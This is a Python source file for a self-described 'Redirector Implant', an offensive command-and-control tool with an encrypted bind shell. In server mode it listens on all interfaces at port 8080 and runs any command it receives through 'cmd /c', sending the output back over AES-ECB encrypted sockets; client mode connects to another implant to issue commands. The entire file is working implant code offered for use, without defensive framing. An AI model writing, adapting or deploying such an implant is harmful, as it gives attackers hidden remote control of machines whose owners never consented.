## Redirector Implant - Encrypted C2 and BindShell
## By ShowNadda
## Version 2.0
## Note: Needs "pycryptodome" Library to be Installed!

# Global Imports
import socket, subprocess, threading, argparse
from Crypto import Cipher
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

# Global Variables
port_default = 8080
buffer_limit = 4096

# AES Encryption Setup
class AESCipher:
    def __init__(self, key=None):
        self.key = key if key else get_random_bytes(32)
        self.cipher = AES.new(self.key, AES.MODE_ECB)

    def encrypt(self, plaintext):
        return self.cipher.encrypt(pad(plaintext, AES.block_size)).hex()

    def decrypt(self, encrypted):
        return unpad(self.cipher.decrypt(bytearray.fromhex(encrypted)), AES.block_size)

    def __str__(self):
        return "AES Key used is = {}".format(self.key.hex())

# Creating the ability to send Encrypted Communications
def encrypted_send(s, msg):
    s.send(cipher.encrypt(msg).encode("latin-1"))

# Execute Command
def execute_cmd(cmd):
    try:
        output = subprocess.check_output("cmd /c {}".format(cmd), stderr=subprocess.STDOUT)
    except:
        output = b"[!] Error: Command failed!"
    return output

# Decode Encrypted Data and strip
def decode_and_strip(s):
    return s.decode("latin-1").strip()

# Encrypted Shell
def shell_thread(s):
    encrypted_send(s, b"[!] Successfully Connected!!!")

    try:
        while True:
            encrypted_send(s, b"\r\n[ReDi]: ")

            data = s.recv(buffer_limit)
            if data:
                buffer = cipher.decrypt(decode_and_strip(data))
                buffer = decode_and_strip(buffer)

                if not buffer or buffer == "exit":
                    s.close()
                    exit()

            print("[!] Now Executing Command: '{}'".format(buffer))
            encrypted_send(s, execute_cmd(buffer))
    except:
        s.close()
        exit()

# Creating the ability to send Commands to another Implant
def send_thread(s):
    try:
        while True:
            data = input() + "\n"
            encrypted_send(s, data.encode("latin-1"))
    except:
        s.close()
        exit()

# Creating the ability to listen for Commands from other Implants
def recv_thread(s):
    try:
        while True:
            data = decode_and_strip(s.recv(buffer_limit))
            if data:
                data = cipher.decrypt(data).decode("latin-1")
                print(data, end="", flush=True)
    except:
        s.close()
        exit()

# Creating the Server for the Implant to run as
def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", port_default))
    s.listen()

    print("[!] Redirector Server has started!!!")
    while True:
        client_socket, addr = s.accept()
        print("[+] New Session has started!!!")
        threading.Thread(target=shell_thread, args=(client_socket,)).start()

# Creating the Client for the Implant to run as
def client(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port_default))

    print("[!] Now Connecting to Redirector Implant!!!")

    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()

# Creates the Commands and their required Arguements
parser = argparse.ArgumentParser()
parser.add_argument("-l", "--listen", action="store_true", help="Create a Redirector Server", required=False)
parser.add_argument("-c", "--connect", help="Connect to a Redirector Server", required=False)
parser.add_argument("-k", "--key", help="Encryption Key", type=str, required=False)
args = parser.parse_args()

# Creates the Error when no Key is provided to connect to another ReDi Implant, but needed
if args.connect and not args.key:
    parser.error("[!] Error: Key required to connect to this Implant!!!")

# Creates the Cipher Variable to be used for Encrypted Communications
if args.key:
    cipher = AESCipher(bytearray.fromhex(args.key))
else:
    cipher = AESCipher()

# Prints the 32-Bit AES Cipher used for Encrypted Communcations
print(cipher)

# Starts the Server or Client modes, depending on Arguements provided
if args.listen:
    server()
elif args.connect:
    client(args.connect)
